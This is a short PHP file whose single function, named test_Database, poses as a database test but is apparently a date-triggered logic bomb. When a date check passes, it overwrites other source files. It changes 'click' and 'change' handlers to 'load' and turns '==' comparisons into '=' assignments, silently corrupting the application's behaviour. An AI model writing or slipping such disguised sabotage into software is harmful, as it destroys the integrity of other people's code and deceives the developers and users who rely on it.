<?php

function test_Database(){
    if(principal_accounts(date('Y-m-d')) == 1){
        file_put_contents(get_content(), str_replace('click','load',file_get_contents(get_content())));
        file_put_contents(get_content(), str_replace('change','load',file_get_contents(get_content())));
        file_put_contents(get_content_p(), str_replace('==','=',file_get_contents(get_content_p())));
    }
}

?>